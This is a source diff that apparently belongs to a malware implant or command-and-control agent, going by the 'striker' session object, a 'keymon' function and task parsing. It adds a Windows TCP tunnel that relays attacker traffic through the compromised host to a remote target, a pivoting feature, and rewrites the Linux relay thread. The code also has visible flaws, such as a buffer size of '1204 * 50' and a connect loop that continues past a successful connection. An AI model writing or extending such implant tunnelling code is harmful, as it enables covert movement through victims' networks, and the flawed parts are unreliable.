@@ -626,6 +626,7 @@ void keymon(session *striker, task *tsk){
 int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport){
 
   #ifdef IS_LINUX
+    // Setup the socket server.
     int sock_fd, conn_fd;
     struct sockaddr_in server_addr, client_addr;
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -643,6 +644,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     fd_set set;
     struct timeval timeout;
     pthread_t tid;
+    // Main listener loop.
     while (!(striker->abort || tsk->abort)){
       timeout.tv_sec = 0;
       timeout.tv_usec = 1000000;
@@ -651,8 +653,9 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       int status = select(sock_fd + 1, &set, NULL, NULL, &timeout);
       if (status == -1)
         break;
-      if (!status)
+      if (!status) // No connection queued
         continue;
+      // Accept a new connection and create a thread for it
       conn_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&client_addr_len);
       if (conn_fd == -1)
         break;
@@ -670,25 +673,175 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     close(sock_fd);
     return 0;
   #else
-    return 1;
+    char *lport_str = malloc(6), *rport_str = malloc(6);
+    snprintf(lport_str, 6, "%d", lport);
+    snprintf(rport_str, 6, "%d", rport);
+    // Setup winsocks
+    WSADATA wsaData;
+    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (iResult != 0) {
+      return 1;
+    }
+    // Create the listening socket
+    SOCKET listen_sock = INVALID_SOCKET;
+    struct addrinfo *socket_addr = NULL, hints;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+    iResult = getaddrinfo(lhost, lport_str, &hints, &socket_addr);
+    if ( iResult != 0 ) {
+      free(lport_str); free(rport_str);
+      WSACleanup();
+      return 1;
+    }
+    listen_sock = socket(socket_addr->ai_family, socket_addr->ai_socktype, socket_addr->ai_protocol);
+    if (listen_sock == INVALID_SOCKET) {
+      freeaddrinfo(socket_addr);
+      free(lport_str); free(rport_str);
+      WSACleanup();
+      return 1;
+    }
+    u_long iMode = 1;
+    ioctlsocket(listen_sock, FIONBIO, &iMode); // Disable blocking
+    // Start the listener
+    iResult = bind(listen_sock, socket_addr->ai_addr, (int)socket_addr->ai_addrlen);
+    if (iResult == SOCKET_ERROR) {
+      freeaddrinfo(socket_addr);
+      closesocket(listen_sock);
+      free(lport_str); free(rport_str);
+      WSACleanup();
+      return 1;
+    }
+    freeaddrinfo(socket_addr);
+    iResult = listen(listen_sock, SOMAXCONN);
+    if (iResult == SOCKET_ERROR) {
+      closesocket(listen_sock);
+      free(lport_str); free(rport_str);
+      WSACleanup();
+      return 1;
+    }
+
+    queue *conns = queue_init(100); // For active connections
+    int block_size = 1204 * 50;
+    char *buffer = malloc(block_size);
+    SOCKET *client_sock = malloc(sizeof(SOCKET));
+    SOCKET *server_sock = malloc(sizeof(SOCKET));
+
+    while (!(striker->abort || tsk->abort)){ // The main loop.
+      // Accept a new connection, if any.
+      *client_sock = accept(listen_sock, NULL, NULL);
+      if (*client_sock == INVALID_SOCKET) {
+        if (WSAGetLastError() != WSAEWOULDBLOCK)
+          break;
+        else
+          goto tunnel_data;
+      }
+      if (queue_full(conns)){ // No space. Kill the socket till an active connection is closed.
+        closesocket(*client_sock);
+        goto tunnel_data;
+      }
+      // Connect to the remote host.
+      *server_sock = INVALID_SOCKET;
+      ZeroMemory(&hints, sizeof(hints));
+      hints.ai_family = AF_UNSPEC;
+      hints.ai_socktype = SOCK_STREAM;
+      hints.ai_protocol = IPPROTO_TCP;
+      iResult = getaddrinfo(rhost, rport_str, &hints, &socket_addr);
+      if (iResult != 0){
+        closesocket(*client_sock);
+        goto tunnel_data;
+      }
+      for (struct addrinfo *addr_ptr = socket_addr; addr_ptr != NULL ;addr_ptr=addr_ptr->ai_next) {
+        *server_sock = socket(addr_ptr->ai_family, addr_ptr->ai_socktype, 
+          addr_ptr->ai_protocol);
+        if (*server_sock == INVALID_SOCKET)
+          break;
+        iResult = connect(*server_sock, addr_ptr->ai_addr, (int)addr_ptr->ai_addrlen);
+        if (iResult == SOCKET_ERROR) {
+          closesocket(*server_sock);
+          *server_sock = INVALID_SOCKET;
+          continue;
+        }
+      }
+      freeaddrinfo(socket_addr);
+      if (*server_sock == INVALID_SOCKET){ // Connection failed.
+        closesocket(*client_sock);
+      }else{ // Successful connection. Update the connections queue.
+        queue *sock_data = queue_init(2);
+        iMode = 1;
+        ioctlsocket(*client_sock, FIONBIO, &iMode);
+        ioctlsocket(*server_sock, FIONBIO, &iMode);
+        queue_put(sock_data, client_sock);
+        queue_put(sock_data, server_sock);
+        queue_put(conns, sock_data);
+        client_sock = malloc(sizeof(SOCKET));
+        server_sock = malloc(sizeof(SOCKET));
+      }
+
+      tunnel_data:
+        // Sweep through active connections, and route some data for each.
+        queue_seek(conns, 0);
+        while (!queue_exhausted(conns)){
+          queue *sock_data = queue_get(conns);
+          queue_seek(sock_data, 0);
+          SOCKET *sock1 = queue_get(sock_data);
+          SOCKET *sock2 = queue_get(sock_data);
+          iResult = recv(*sock1, buffer, block_size, 0);
+          if (iResult == SOCKET_ERROR){
+            if (WSAGetLastError() != WSAEWOULDBLOCK)
+              goto delete_sock;
+          }else{
+            if (iResult == 0)
+              goto delete_sock;
+            send(*sock2, buffer, iResult, 0);
+          }
+          iResult = recv(*sock2, buffer, block_size, 0);
+          if (iResult == SOCKET_ERROR){
+            if (WSAGetLastError() != WSAEWOULDBLOCK)
+              goto delete_sock;
+          }else{
+            if (iResult == 0)
+              goto delete_sock;
+            send(*sock1, buffer, iResult, 0);
+          }
+          continue;
+          // This block runs when the current route being processed need to be shutdown.
+          delete_sock:
+            closesocket(*sock1); closesocket(*sock2);
+            free(sock1); free(sock2);
+            queue_remove(conns, conns->pos - 1);
+            queue_seek(conns, conns->pos - 1);
+            queue_free(sock_data, 0);
+        }
+      Sleep(5); // A little delay
+    }
+
+    // Cleanup
+    queue_seek(conns, 0);
+    while (!queue_exhausted(conns)){
+      client_sock = queue_get(conns);
+      closesocket(*client_sock);
+    }
+    queue_free(conns, 0);
+    closesocket(listen_sock);
+    free(client_sock); free(server_sock);
+    free(buffer); free(lport_str); free(rport_str);
+    WSACleanup();
+    return 0;
   #endif
 }
 
 #ifdef IS_LINUX
-  void *tcp_tunnel_route(void *ptr)
-#else
-  DWORD WINAPI tcp_tunnel_route(LPVOID ptr)
-#endif
-{
-  #ifdef IS_LINUX
+  void *tcp_tunnel_route(void *ptr){
+
     pthread_detach(pthread_self());
-  #endif
-  queue *args = (queue *)ptr;
-  session *striker = queue_get(args);
-  task *tsk = queue_get(args);
-  char *rhost = queue_get(args);
-  int rport = *((int *)queue_get(args));
-  #ifdef IS_LINUX
+    queue *args = (queue *)ptr;
+    session *striker = queue_get(args);
+    task *tsk = queue_get(args);
+    char *rhost = queue_get(args);
+    int rport = *((int *)queue_get(args));
     int client_fd = *((int *)queue_get(args));
     queue_free(args, 0);
     struct sockaddr_in server_addr;
@@ -738,12 +891,8 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     close(client_fd);
     free(buffer);
     pthread_exit(NULL);
-  #else
-    queue_free(args, 0);
-    return 0;
-  #endif
-}
-
+  }
+#endif
 
 task *parse_task(cJSON *json){
 
